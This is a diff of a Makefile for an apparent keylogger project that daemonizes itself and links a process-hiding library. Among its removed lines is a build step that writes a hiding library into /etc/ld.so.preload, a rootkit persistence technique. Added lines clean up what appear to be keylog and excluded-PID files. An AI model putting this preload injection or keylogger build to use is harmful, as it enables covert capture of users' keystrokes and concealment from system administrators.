@@ -13,7 +13,6 @@ PATH_OBJ	=	objs
 PATH_LOG	=	logs
 PATH_LIBH	=	lib/hideprocess
 PATH_LIBFT	=	lib/libft
-PATH_INSTALL=	/usr/local/lib/
 
 # List of sources
 SRCS		=	$(addprefix $(PATH_SRC)/, keylogger.c keymap.c utils.c mod.c daemonize.c signals.c)
@@ -43,12 +42,12 @@ _SUCCESS	=	[$(_GREEN)SUCCESS$(_RESET)]
 # Functions
 all:	init $(NAME)
 	@ echo "$(_SUCCESS) Compilation done"
+	@ $(warning    Test)
+	@ $(info    $(_SUCCESS)Test2$(LOG))
 
 init:
 	@ $(shell mkdir -p $(PATH_OBJ) $(PATH_LOG))
 	@ make -C $(PATH_LIBH)
-	@ mv $(PATH_LIBH)/procsHides.so $(PATH_INSTALL)
-	@ echo /usr/local/lib/procsHides.so >> /etc/ld.so.preload
 	@ make -C $(PATH_LIBFT)
 
 $(NAME): $(OBJS) $(INCS)
@@ -67,12 +66,21 @@ $(PATH_OBJ)/%.o : $(PATH_SRC)/%.c  $(INCS)
 
 clean:
 	@ $(RM) -rf $(PATH_OBJ)
-	@ echo "$(_INFO) Deleted files and directory"
-#	@ make -C $(PATH_LIBFT) clean
+	@ make -C $(PATH_LIBH) clean
+	@ make -C $(PATH_LIBFT) clean
+	@ echo "$(_INFO) Some files and directories deleted"
+
 
 fclean: clean
 	@ $(RM) -rf $(NAME)
 	@ $(RM) -rf $(PATH_LOG)
-#	@ make -C $(PATH_LIBFT) fclean
+	@ $(RM) -rf "/var/cache/pid_to_exclude"
+	@ $(RM) -rf "klg.data"
+	@ make -C $(PATH_LIBH)	fclean
+	@ make -C $(PATH_LIBFT) fclean
+	@ echo "$(_INFO) All files and directories deleted"
+	$(info    MAKE $(_INFO) RE is )
+
+
 
 re: fclean all
